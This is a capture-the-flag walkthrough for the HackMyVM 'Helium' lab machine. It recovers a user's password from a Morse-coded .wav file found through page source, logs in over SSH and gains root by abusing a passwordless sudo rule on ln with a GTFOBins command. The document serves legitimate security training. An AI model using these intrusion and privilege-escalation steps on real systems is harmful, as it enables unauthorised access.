# Write up for [Helium-HMV](https://hackmyvm.eu/machines/machine.php?vm=Helium)

**Machine:** [Helium](https://hackmyvm.eu/machines/machine.php?vm=Helium)

**IP:** `10.10.10.100`  

**URL:** `http://10.10.10.100`

---

## Enumeration

### Port Scan

22/tcp open  ssh   OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
80/tcp open  http  nginx 1.14.2

---

## Web Enumeration

Open the website:
```zsh
firefox http://10.10.10.100 &
```
View page source.

Found comment:

<!-- Please paul, stop uploading weird .wav files using /upload_sound -->

➡️ **Username identified:** `paul`

---

## Information Disclosure

While inspecting resources:

view-source:http://10.10.10.100/bootstrap.min.css

Found reference to:

/yay/mysecretsound.wav

Download the file:
```zsh
wget http://10.10.10.100/yay/mysecretsound.wav
```
---

## Credential Discovery

The `.wav` file contains Morse code.

Decoded using:  
https://morsecode.world/international/decoder/audio-decoder-adaptive.html

Recovered password:

da******o

---

## Initial Access

Login via SSH:
```zsh
ssh paul@10.10.10.100
```
Read user flag:
```zsh
cat user.txt
```
---

## Privilege Escalation

Check sudo permissions:
```zsh
sudo -l
```
Output:
```
User paul may run the following commands on helium:  
(ALL : ALL) NOPASSWD: /usr/bin/ln
```
Search GTFOBins for ln:  
[GTFOBins-ln-sudo](https://gtfobins.github.io/gtfobins/ln/#sudo)

---

## Root Access

Exploit `ln`:

```zsh
sudo ln -fs /bin/bash /usr/bin/ln
```

Resulting shell:
```zsh
root@helium:/home/paul# id  
uid=0(root) gid=0(root) groups=0(root)
```
---
